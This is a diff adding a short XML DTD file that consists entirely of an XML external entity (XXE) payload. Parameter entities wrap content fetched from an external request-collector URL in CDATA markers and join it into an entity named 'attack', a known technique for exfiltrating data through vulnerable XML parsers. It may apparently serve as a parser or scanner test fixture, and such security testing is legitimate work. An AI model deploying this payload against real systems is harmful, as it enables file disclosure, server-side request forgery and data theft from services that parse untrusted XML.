@@ -1,0 +1,5 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % stuff SYSTEM "https://enllfgxx7hk1e.x.pipedream.net/polybyp2">
+<!ENTITY % end "]]>">
+<!ENTITY attack "%start;%stuff;%end;">
